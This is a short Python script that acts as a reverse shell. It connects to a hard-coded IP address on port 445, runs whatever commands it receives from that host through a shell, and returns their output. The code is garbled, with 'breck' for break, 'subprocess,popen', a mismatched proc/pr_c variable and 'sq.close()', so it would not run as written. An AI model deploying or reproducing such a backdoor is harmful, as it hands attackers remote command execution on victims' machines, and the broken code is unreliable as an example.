#!/usr/bin/python
import subprocess,socket
host = '192.168.43.101'
port = 445
s_q = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s_q.connect((host,port))
s_q.send('hello There!')
while 1:
    data = s_q.recv(1024)
    if data == 'quit': breck

    pr_c = subprocess,popen(data, shell =True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    std_output = proc.stdout.read() + proc.stderr.read()
    s_q.send(std_output)
#exit the loop
s_q.send('good Bye')
sq.close()    